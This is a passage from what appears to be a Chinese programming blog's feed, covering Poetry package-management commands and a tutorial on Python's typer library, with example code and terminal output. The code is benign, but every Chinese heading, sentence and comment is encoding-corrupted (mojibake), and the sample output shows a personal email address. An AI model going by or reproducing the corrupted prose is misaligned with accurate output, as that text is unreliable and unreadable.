class="headerlink" title="è¿½è¸ª &amp; æ›´æ–°åŒ…"></a>è¿½è¸ª &amp; æ›´æ–°åŒ…</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry show</span><span class="line">poetry show --tree <span class="hljs-comment"># æŸ¥çœ‹ä¾èµ–å…³ç³»</span></span><span class="line">poetry show --outdated <span class="hljs-comment"># æŸ¥çœ‹å¯ä»¥æ›´æ–°çš„ä¾èµ–</span></span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry update <span class="hljs-comment"># æ›´æ–°æ‰€æœ‰é”å®šç‰ˆæœ¬çš„ä¾èµ–</span></span><span class="line">poetry update dep_name <span class="hljs-comment"># æ›´æ–°æŸä¸ªæŒ‡å®šçš„ä¾èµ–</span></span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry remove dep_name <span class="hljs-comment"># å¸è½½åŒ…</span></span></code></pre></div></div><h3 id="åˆ‡æ¢pythonç‰ˆæœ¬"><a href="#åˆ‡æ¢pythonç‰ˆæœ¬" class="headerlink" title="åˆ‡æ¢pythonç‰ˆæœ¬"></a>åˆ‡æ¢pythonç‰ˆæœ¬</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry env use python3.8</span></code></pre></div></div><h3 id="å®‰è£…é¡¹ç›®"><a href="#å®‰è£…é¡¹ç›®" class="headerlink" title="å®‰è£…é¡¹ç›®"></a>å®‰è£…é¡¹ç›®</h3><p>æ ¹æ®<code>pyproject.toml</code>å®‰è£…é¡¹ç›®</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry install</span><span class="line">poetry install --no-dev <span class="hljs-comment"># ä¸å®‰è£…å¼€å‘ä¾èµ–</span></span><span class="line">poetry install --no-root <span class="hljs-comment"># ä¸å®‰è£…é¡¹ç›®æœ¬èº«</span></span></code></pre></div></div><h3 id="æ„å»º"><a href="#æ„å»º" class="headerlink" title="æ„å»º"></a>æ„å»º</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry build</span></code></pre></div></div><h3 id="å‘å¸ƒ"><a href="#å‘å¸ƒ" class="headerlink" title="å‘å¸ƒ"></a>å‘å¸ƒ</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry publish</span><span class="line">poetry publish --build <span class="hljs-comment"># å‘å¸ƒå‰å…ˆæ„å»º</span></span></code></pre></div></div><p>è¦å‘å¸ƒåˆ°pipyï¼Œå¯ä»¥å…ˆè·å–<a href="https://pypi.org/manage/account/token/">Token</a></p><p>token å°±åƒä¸‹é¢è¿™æ ·:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">pypi</span>-wubalubadubdub-deadbeef<span class="hljs-number">1234</span></span></code></pre></div></div><p>ç„¶åå†™å…¥åˆ°poetry</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry config pypi-token.pypi pypi-wubalubadubdub-deadbeef1234</span></code></pre></div></div><p>ç„¶åå°±å¯ä»¥ç›´æ¥å‘å¸ƒäº†</p><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><h3 id="è¦æƒ³åœ¨å¼€å‘çš„æ—¶å€™å®‰è£…å…¶ä»–é¡¹ç›®çš„åŒ…è¯¥æ€ä¹ˆåŠ"><a href="#è¦æƒ³åœ¨å¼€å‘çš„æ—¶å€™å®‰è£…å…¶ä»–é¡¹ç›®çš„åŒ…è¯¥æ€ä¹ˆåŠ" class="headerlink" title="è¦æƒ³åœ¨å¼€å‘çš„æ—¶å€™å®‰è£…å…¶ä»–é¡¹ç›®çš„åŒ…è¯¥æ€ä¹ˆåŠ"></a>è¦æƒ³åœ¨å¼€å‘çš„æ—¶å€™å®‰è£…å…¶ä»–é¡¹ç›®çš„åŒ…è¯¥æ€ä¹ˆåŠ</h3><p>æˆ‘é‡åˆ°äº†ä¸€ä¸ªæƒ…å†µï¼Œå½“æˆ‘åŒæ—¶å¼€å‘ä¸¤ä¸ªåŒ…å¹¶ä¸”æœ‰ä¾èµ–å…³ç³»çš„æ—¶å€™ï¼Œpoetryå¹¶ä¸èƒ½å®‰è£…å¦å¤–è·¯å¾„çš„åŒ…</p><p>å‡è®¾<code>packageA</code>ä¾èµ–<code>packageB</code></p><p>åœ¨<code>packageB</code>ä¸­çš„è™šæ‹Ÿç¯å¢ƒå®‰è£…å®Œå,è¿™æ—¶å€™æŸ¥çœ‹è™šæ‹Ÿç¯å¢ƒä¸­çš„<code>Lib/site-packages</code>å…¶å®å¯ä»¥çœ‹åˆ°åŒ…å«äº†ä¸¤æ ·ä¸œè¥¿ï¼š</p><ol><li><code>&lt;packageB&gt;.dist-info</code></li><li><code>&lt;packageB&gt;.pth</code></li></ol><p>å°†è¿™ä¸¤ä¸ªæ–‡ä»¶å¤åˆ¶åˆ°<code>packageA</code>ä¸­çš„è™šæ‹Ÿç¯å¢ƒè·¯å¾„ä¸‹çš„<code>Lib/site-packages</code>ä¸­å°±å¯ä»¥äº†ã€‚</p><p><code>&lt;packageB.pth&gt;</code>é‡Œé¢å°±æ˜¯åŒ…æ–‡ä»¶çš„è·¯å¾„ï¼Œç›´æ¥è‡ªå·±å†™ä¹Ÿå¯ä»¥ã€‚<br>ä¾‹å¦‚ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-arcade codeBlockLines"><span class="line">D:<span class="hljs-regexp">/CodeLibrary/gi</span>t_project/ntc-templates</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python typer åº“ä½¿ç”¨æŒ‡å—</title>
      <link href="/2022/02/23/python-typer-%E5%BA%93%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2022/02/23/python-typer-%E5%BA%93%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<p><code>click</code>æ˜¯<code>Argparse</code>çš„å‡çº§ç‰ˆï¼Œè€Œ<code>typer</code>åˆ™æ˜¯<code>click</code>çš„å‡çº§ç‰ˆï¼Œå…¶ä¸­æœ€å¤§çš„ä¼˜åŠ¿å°±æ˜¯å¯ä»¥é€šè¿‡å‚æ•°çš„ç±»å‹è¯†åˆ«æ¥å¿«é€Ÿå»ºç«‹CLIã€‚</p><h2 id="åˆè¯†"><a href="#åˆè¯†" class="headerlink" title="åˆè¯†"></a>åˆè¯†</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line">import typer</span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    <span class="hljs-symbol">firstname:</span> str,  <span class="hljs-comment"># ç®€å•çš„å‚æ•°ï¼Œé»˜è®¤ç­‰åŒäº firstname: str = typer.Argument(...)</span></span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    <span class="hljs-symbol">lastname:</span> str = typer.Argument(..., help=<span class="hljs-string">&quot;Lastname&quot;</span>)</span></span>,  <span class="hljs-comment"># ... è¡¨ç¤ºå¿…é€‰ï¼Œ è™½ç„¶ Argument æœ¬èº«å°±æ˜¯å¿…é€‰</span></span><span class="line">    <span class="hljs-symbol">email:</span> str = typer.Option(..., <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;--email&#x27;</span>,    <span class="hljs-comment"># Option ä¸ºå¯é€‰å‚æ•°ï¼Œ ... è¡¨ç¤ºè¿™ä¸ªå¯é€‰å‚æ•°ä¸ºå¿…é€‰é¡¹, åé¢å¯è·Ÿç¼©å†™å’Œéç¼©å†™çš„å‚æ•°å</span></span><span class="line">                              prompt=<span class="hljs-string">&quot;Please enter your email&quot;</span>),  <span class="hljs-comment"># prompt ä¸ºæç¤ºä¿¡æ¯, å¦‚æœæ²¡æœ‰æ˜ç¡®æŒ‡å®šï¼Œåˆ™ä¼šå¼¹å‡ºæç¤ºè¦æ±‚è¾“å…¥</span></span><span class="line">    <span class="hljs-comment"># ç±»å‹ä¸ºintï¼Œæ‰€ä»¥å¯ä»¥æŒ‡å®šæœ€å°å€¼å’Œæœ€å¤§å€¼, clamp è¡¨ç¤ºè¶…å‡ºäº†å°±æŒ‰ç…§æœ€å¤§å€¼æˆ–æœ€å°å€¼æ¥å¤„ç†</span></span><span class="line">    <span class="hljs-symbol">age:</span> int = typer.Option(None, <span class="hljs-string">&#x27;-a&#x27;</span>, <span class="hljs-string">&#x27;--age&#x27;</span>, min=<span class="hljs-number">1</span>, max=<span class="hljs-number">100</span>, clamp=True)</span><span class="line">):</span><span class="line">    <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span></span><span class="line"><span class="hljs-string">    Say hello to someone.</span></span><span class="line"><span class="hljs-string">    &quot;</span><span class="hljs-string">&quot;&quot;</span></span><span class="line">    <span class="hljs-comment"># ä¸Šæ–¹ä¸ºCLIçš„æè¿°, ä¼šè‡ªåŠ¨æ”¾å…¥å¸®åŠ©ä¿¡æ¯</span></span><span class="line">    print(f<span class="hljs-string">&quot;Hello &#123;firstname&#125; &#123;lastname&#125;&quot;</span>)</span><span class="line">    print(f<span class="hljs-string">&#x27;Your email is &#123;email&#125;&#x27;</span>)</span><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-symbol">age:</span></span><span class="line">        print(f<span class="hljs-string">&#x27;Your age is &#123;age&#125;&#x27;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    typer.run(main)  <span class="hljs-comment"># è¿è¡Œä¸»å‡½æ•°</span></span></code></pre></div></div><p>å¯ä»¥çœ‹åˆ°ï¼Œå½“åªéœ€è¦ä¸€ä¸ªä¸»å‘½ä»¤çš„æ—¶å€™ï¼Œé‚£ä¹ˆä½¿ç”¨<code>typer.run(main)</code>ä¼šéå¸¸æ–¹ä¾¿ã€‚</p><p>å‚æ•°æœ‰ä¸¤ç§<code>typer.Argument</code> å’Œ <code>typer.Option</code></p><p>è¾“å‡ºç»“æœï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-vim codeBlockLines"><span class="line">&gt; <span class="hljs-keyword">python</span> .\<span class="hljs-number">1</span>.<span class="hljs-keyword">py</span> --<span class="hljs-keyword">help</span></span><span class="line">Usage: <span class="hljs-number">1</span>.<span class="hljs-keyword">py</span> [OPTIONS] FIRSTNAME LASTNAME</span><span class="line"></br></span><span class="line">  Say hello <span class="hljs-keyword">to</span> someone.</span><span class="line"></br></span><span class="line">Argument<span class="hljs-variable">s:</span></span><span class="line">  FIRSTNAME  [required]</span><span class="line"></br></span><span class="line">Option<span class="hljs-variable">s:</span></span><span class="line">  -<span class="hljs-keyword">e</span>, --email TEXT         [required]</span><span class="line">  --install-completion     Install completion <span class="hljs-keyword">for</span> the current <span class="hljs-keyword">shell</span>.</span><span class="line">  --show-completion        Show completion <span class="hljs-keyword">for</span> the current <span class="hljs-keyword">shell</span>, <span class="hljs-keyword">to</span> <span class="hljs-keyword">copy</span> it</span><span class="line">                           <span class="hljs-built_in">or</span> customize the installation.</span><span class="line">  --<span class="hljs-keyword">help</span>                   Show this message <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span>.</span><span class="line"></br></span><span class="line">&gt; <span class="hljs-keyword">python</span> .\<span class="hljs-number">1</span>.<span class="hljs-keyword">py</span> Fried Pei </span><span class="line">Please enter your emai<span class="hljs-variable">l:</span> <span class="hljs-number">365433079</span>@qq.<span class="hljs-keyword">com</span></span><span class="line">Hello Fried Pei</span><span class="line">Your email <span class="hljs-keyword">is</span> <span class="hljs-number">365433079</span>@qq.<span class="hljs-keyword">com</span></span><span class="line"></br></span><span class="line">&gt; <span class="hljs-keyword">python</span> .\<span class="hljs-number">1</span>.<span class="hljs-keyword">py</span> Fried Pei --age <span class="hljs-number">28</span> --email <span class="hljs-number">365433079</span>@qq.<span class="hljs-keyword">com</span>  </span><span class="line">Hello Fried Pei</span><span class="line">Your email <span class="hljs-keyword">is</span> <span class="hljs-number">365433079</span>@qq.<span class="hljs-keyword">com</span></span><span class="line">Your age <span class="hljs-keyword">is</span> <span class="hljs-number">28</span></span></code></pre></div></div><h2 id="å½“æœ‰å¤šä¸ªå­å‘½ä»¤æ—¶"><a href="#å½“æœ‰å¤šä¸ªå­å‘½ä»¤æ—¶" class="headerlink" title="å½“æœ‰å¤šä¸ªå­å‘½ä»¤æ—¶"></a>å½“æœ‰å¤šä¸ªå­å‘½ä»¤æ—¶</h2><p>æ¯”å¦‚ä½¿ç”¨<code>git</code>çš„æ—¶å€™ï¼Œæ—¢å¯ä»¥ç›´æ¥ä½¿ç”¨ä¹Ÿå¯ä»¥<code>git push --all</code> è¿™æ ·çš„å‘½ä»¤</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line">import typer</span><span class="line"></br></span><span class="line">app = typer.Typer()  <span class="hljs-comment"># åˆå§‹åŒ–app</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># callback ä¸ºä¸»å‘½ä»¤</span></span><span class="line"><span class="hljs-comment"># invoke_without_command å½“æ²¡æœ‰å­å‘½ä»¤æ—¶ä¹Ÿå¯ä»¥æ‰§è¡Œ</span></span><span class="line"><span class="hljs-variable">@app</span>.callback(invoke_without_command=True)</span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    <span class="hljs-symbol">ctx:</span> typer.Context,  <span class="hljs-comment"># ä¸Šä¸‹æ–‡ï¼Œæ”¾åœ¨ç¬¬ä¸€ä¸ª</span></span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    <span class="hljs-symbol">verbose:</span> int = typer.Option(</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        <span class="hljs-number">0</span>, <span class="hljs-string">&quot;--verbose&quot;</span>, <span class="hljs-string">&quot;-v&quot;</span>, help=<span class="hljs-string">&#x27;Verbosity level(1-3)&#x27;</span>,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        count=True, show_default=False)</span></span>,  <span class="hljs-comment"># è¿›è¡Œè®¡æ•°ï¼Œ å¹¶ä¸”ä¸æ˜¾ç¤ºé»˜è®¤å€¼</span></span><span class="line">):</span><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-symbol">verbose:</span></span><span class="line">        print(<span class="hljs-string">&quot;verbose level: &#123;&#125;&quot;</span>.format(verbose))</span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">if</span> ctx.invoked_subcommand is <span class="hljs-symbol">None:</span>  <span class="hljs-comment"># å½“æ²¡æœ‰å­å‘½ä»¤æ—¶æ‰§è¡Œ</span></span><span class="line">        print(<span class="hljs-string">&quot;Run main process&quot;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># command ä¸ºå­å‘½ä»¤</span></span><span class="line"><span class="hljs-variable">@app</span>.command()</span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">push</span><span class="hljs-params">(</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    <span class="hljs-symbol">ctx:</span> typer.Context,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    <span class="hljs-symbol">all:</span> bool = typer.Option(False, <span class="hljs-string">&quot;--all&quot;</span>, <span class="hljs-string">&quot;-a&quot;</span>, help=<span class="hljs-string">&quot;Push all&quot;</span>)</span></span></span><span class="line">):</span><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-symbol">all:</span></span><span class="line">        print(<span class="hljs-string">&quot;push all&quot;</span>)</span><span class="line">        raise typer.Exit()  <span class="hljs-comment"># ä¸»åŠ¨é€€å‡º  è¿˜æœ‰ä¸€ç§ typer.Abort() ä¼šæœ‰æç¤º Abort!</span></span><span class="line"></br></span><span class="line">    print(<span class="hljs-string">&quot;push&quot;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:</span><span class="line">    app()  <span class="hljs-comment"># å¯åŠ¨app, å»æ‰¾ callback è£…é¥°çš„å‡½æ•°</span></span></code></pre></div></div><p>å¯ä»¥çœ‹ä½¿ç”¨<code>app()</code>æœ€æœ¬è´¨çš„åšæ³•æ˜¯<code>typer.Typer()</code>, å¹¶ä¸”å¯¹ä¸»å‘½ä»¤ä½¿ç”¨<code>@callback</code> å¯¹å­å‘½ä»¤ä½¿ç”¨<code>command</code><br>å¦å¤–<code>typer.Context</code>å‚¨å­˜ç€ä¸Šä¸‹æ–‡å˜é‡ï¼Œ <code>typer.Context.invoke_without_command</code>ä¸ºæŸ¥çœ‹æ˜¯å¦æœ‰å­å‘½ä»¤</p><p>è¾“å‡ºä¸ºï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-vim codeBlockLines"><span class="line">&gt; <span class="hljs-keyword">python</span> .\<span class="hljs-number">2</span>.<span class="hljs-keyword">py</span> --<span class="hljs-keyword">help</span>    </span><span class="line">Usage: <span class="hljs-number">2</span>.<span class="hljs-keyword">py</span> [OPTIONS] COMMAND [ARGS]...</span><span class="line"></br></span><span class="line">  -v, --<span class="hljs-keyword">verbose</span>         Verbosity level(<span class="hljs-number">1</span>-<span class="hljs-number">3</span>)</span><span class="line">  --install-completion  Install completion <span class="hljs-keyword">for</span> the current <span class="hljs-keyword">shell</span>.</span><span class="line">  --show-completion     Show completion <span class="hljs-keyword">for</span> the current <span class="hljs-keyword">shell</span>, <span class="hljs-keyword">to</span> <span class="hljs-keyword">copy</span> it <span class="hljs-built_in">or</span></span><span class="line">                        customize the installation.</span><span class="line">  --<span class="hljs-keyword">help</span>                Show this message <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span>.</span><span class="line"></br></span><span class="line">  push</span><span class="line"></br></span><span class="line">&gt; <span class="hljs-keyword">python</span> .\<span class="hljs-number">2</span>.<span class="hljs-keyword">py</span> -vv</span><span class="line"><span class="hljs-keyword">verbose</span> leve<span class="hljs-variable">l:</span> <span class="hljs-number">2</span></span><span class="line">Run main process</span><span class="line"></br></span><span class="line">&gt; <span class="hljs-keyword">python</span> .\<span class="hljs-number">2</span>.<span class="hljs-keyword">py</span> push --<span class="hljs-keyword">all</span></span><span class="line">push <span class="hljs-keyword">all</span></span></code></pre></div></div><h2 id="callback-å‚æ•°è°ƒç”¨å‡½æ•°"><a href="#callback-å‚æ•°è°ƒç”¨å‡½æ•°" class="headerlink" title="callback å‚æ•°è°ƒç”¨å‡½æ•°"></a>callback å‚æ•°è°ƒç”¨å‡½æ•°</h2><p>æ¯”å¦‚éœ€è¦çœ‹ bannerï¼Œæˆ–è€… version çš„æ—¶å€™ï¼Œå†™åœ¨ä¸»å‡½æ•°é‡Œé¢éš¾å…æœ‰äº›è‡ƒè‚¿ï¼Œé‚£ä¹ˆå•ç‹¬å–ä¸€ä¸ªå›è°ƒä¼šå¥½å¾ˆå¤š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line">import typer</span><span class="line"></br></span><span class="line">app = typer.Typer()</span><span class="line">state = &#123;<span class="hljs-string">&quot;verbose&quot;</span>: False&#125;</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dis_version</span><span class="hljs-params">(<span class="hljs-symbol">display:</span> bool)</span></span>:</span><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-symbol">display:</span></span><span class="line">        print(<span class="hljs-string">&#x27;Version 0.0.1&#x27;</span>)</span><span class="line">        raise typer.Exit() <span class="hljs-comment"># æ˜¾ç¤ºå®Œåé€€å‡º</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-variable">@app</span>.callback(invoke_without_command=True)</span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-symbol">ctx:</span> typer.Context,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">         <span class="hljs-symbol">verbose:</span> bool = False,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">         <span class="hljs-symbol">version:</span> bool = typer.Option(</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">             False, <span class="hljs-string">&quot;--version&quot;</span>, <span class="hljs-string">&quot;-v&quot;</span>, help=<span class="hljs-string">&quot;Show version&quot;</span>,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">             callback=dis_version, is_eager=True)</span></span>,  <span class="hljs-comment"># è°ƒç”¨ dis_version å‡½æ•°ï¼Œ å¹¶ä¸”ä¼˜å…ˆçº§æœ€é«˜(is_eager)</span></span><span class="line">         ):</span><span class="line">    <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span></span><span class="line"><span class="hljs-string">    Manage users in the awesome CLI app.</span></span><span class="line"><span class="hljs-string">    &quot;</span><span class="hljs-string">&quot;&quot;</span></span><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-symbol">verbose:</span></span><span class="line">        typer.echo(<span class="hljs-string">&quot;Will write verbose output&quot;</span>)</span><span class="line">        state[<span class="hljs-string">&quot;verbose&quot;</span>] = True</span><span class="line"></br></span><span class="line">    typer.confirm(<span class="hljs-string">&quot;Are you sure?&quot;</span>, default=True, abort=True)  <span class="hljs-comment"># ç»™å‡ºé€‰é¡¹ï¼Œaborté€‰é¡¹è¡¨ç¤º No åˆ™ç›´æ¥ä¸­æ–­</span></span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">if</span> ctx.invoked_subcommand is <span class="hljs-symbol">None:</span></span><span class="line">        print(<span class="hljs-string">&#x27;main process&#x27;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:</span><span class="line">    app()</span></code></pre></div></div><h2 id="å½“éœ€è¦-helpçš„çŸ­å‘½ä»¤-hçš„æ—¶å€™"><a href="#å½“éœ€è¦-helpçš„çŸ­å‘½ä»¤-hçš„æ—¶å€™" class="headerlink" title="å½“éœ€è¦--helpçš„çŸ­å‘½ä»¤-hçš„æ—¶å€™"></a>å½“éœ€è¦<code>--help</code>çš„çŸ­å‘½ä»¤<code>-h</code>çš„æ—¶å€™</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> typer</span><span class="line"></br></span><span class="line">app = typer.Typer()</span><span class="line"></br></span><span class="line">CONTEXT_SETTINGS = <span class="hljs-built_in">dict</span>(help_option_names=[<span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;--help&#x27;</span>])</span><span class="line"><span class="hljs-meta">@app.command(<span class="hljs-params">context_settings=CONTEXT_SETTINGS</span>)</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">nom: <span class="hljs-built_in">str</span></span>):</span></span><span class="line">    ...</span></code></pre></div></div><h2 id="get-app-dir-å–é…ç½®æ–‡ä»¶å¤¹è·¯å¾„"><a href="#get-app-dir-å–é…ç½®æ–‡ä»¶å¤¹è·¯å¾„" class="headerlink" title="get_app_dir å–é…ç½®æ–‡ä»¶å¤¹è·¯å¾„"></a>get_app_dir å–é…ç½®æ–‡ä»¶å¤¹è·¯å¾„</h2><p>å®šä¹‰å¦‚ä¸‹</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_app_dir</span>(<span class="hljs-params">app_name, roaming=<span class="hljs-literal">True</span>, force_posix=<span class="hljs-literal">False</span></span>):</span></span><span class="line">    <span class="hljs-string">r&quot;&quot;&quot;Returns the config folder for the application.  The default behavior</span></span><span class="line"><span class="hljs-string">    is to return whatever is most appropriate for the operating system.</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">    To give you an idea, for an app called ``&quot;Foo Bar&quot;``, something like</span></span><span class="line"><span class="hljs-string">    the following folders could be returned:</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">    Mac OS X:</span></span><span class="line"><span class="hljs-string">      ``~/Library/Application Support/Foo Bar``</span></span><span class="line"><span class="hljs-string">    Mac OS X (POSIX):</span></span><span class="line"><span class="hljs-string">      ``~/.foo-bar``</span></span><span class="line"><span class="hljs-string">    Unix:</span></span><span class="line"><span class="hljs-string">      ``~/.config/foo-bar``</span></span><span class="line"><span class="hljs-string">    Unix (POSIX):</span></span><span class="line"><span class="hljs-string">      ``~/.foo-bar``</span></span><span class="line"><span class="hljs-string">    Win XP (roaming):</span></span><span class="line"><span class="hljs-string">      ``C:\Documents and Settings\&lt;user&gt;\Local Settings\Application Data\Foo Bar``</span></span><span class="line"><span class="hljs-string">    Win XP (not roaming):</span></span><span class="line"><span class="hljs-string">      ``C:\Documents and Settings\&lt;user&gt;\Application Data\Foo Bar``</span></span><span class="line"><span class="hljs-string">    Win 7 (roaming):</span></span><span class="line"><span class="hljs-string">      ``C:\Users\&lt;user&gt;\AppData\Roaming\Foo Bar``</span></span><span class="line"><span class="hljs-string">    Win 7 (not roaming):</span></span><span class="line"><span class="hljs-string">      ``C:\Users\&lt;user&gt;\AppData\Local\Foo Bar``</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">    .. versionadded:: 2.0</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">    :param app_name: the application name.  This should be properly capitalized</span></span><span class="line"><span class="hljs-string">                     and can contain whitespace.</span></span><span class="line"><span class="hljs-string">    :param roaming: controls if the folder should be roaming or not on Windows.</span></span><span class="line"><span class="hljs-string">                    Has no affect otherwise.</span></span><span class="line"><span class="hljs-string">    :param force_posix: if this is set to `True` then on any POSIX system the</span></span><span class="line"><span class="hljs-string">                        folder will be stored in the home folder with a leading</span></span><span class="line"><span class="hljs-string">                        dot instead of the XDG config home or darwin&#x27;s</span></span><span class="line"><span class="hljs-string">                        application support folder.</span></span><span class="line"><span class="hljs-string">    &quot;&quot;&quot;</span></span></code></pre></div></div><p>ä½¿ç”¨ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> typer</span><span class="line"></br></span><span class="line">APP_NAME = <span class="hljs-string">&#x27;cmder&#x27;</span></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span></span><span class="line">    app_dir = typer.get_app_dir(APP_NAME, force_posix=<span class="hljs-literal">True</span>)</span><span class="line">    config_path: Path = Path(app_dir) / <span class="hljs-string">&quot;config.json&quot;</span></span></code></pre></div></div><h2 id="å‚æ•°ç±»å‹"><a href="#å‚æ•°ç±»å‹" class="headerlink" title="å‚æ•°ç±»å‹"></a>å‚æ•°ç±»å‹</h2><h3 id="int"><a href="#int" class="headerlink" title="int"></a>int</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    <span class="hljs-symbol">id:</span> int = typer.Argument(..., min=<span class="hljs-number">0</span>, max=<span class="hljs-number">1000</span>)</span></span>,</span><span class="line">    <span class="hljs-symbol">rank:</span> int = typer.Option(<span class="hljs-number">0</span>, max=<span class="hljs-number">10</span>, clamp=True),</span><span class="line">    <span class="hljs-symbol">score:</span> float = typer.Option(<span class="hljs-number">0</span>, min=<span class="hljs-number">0</span>, max=<span class="hljs-number">100</span>, clamp=True),</span><span class="line">)<span class="hljs-symbol">:</span></span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-symbol">verbose:</span> int = typer.Option(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;--verbose&quot;</span>, <span class="hljs-string">&quot;-v&quot;</span>, count=True)</span></span>)<span class="hljs-symbol">:</span></span></code></pre></div></div><ul><li>min æœ€å°å€¼</li><li>max æœ€å¤§å€¼</li><li>clamp è¶…å‡ºå€¼åæŒ‰æœ€å°/å¤§å¤„ç†</li><li>count è®¡æ•°</li></ul><h3 id="bool"><a href="#bool" class="headerlink" title="bool"></a>bool</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span 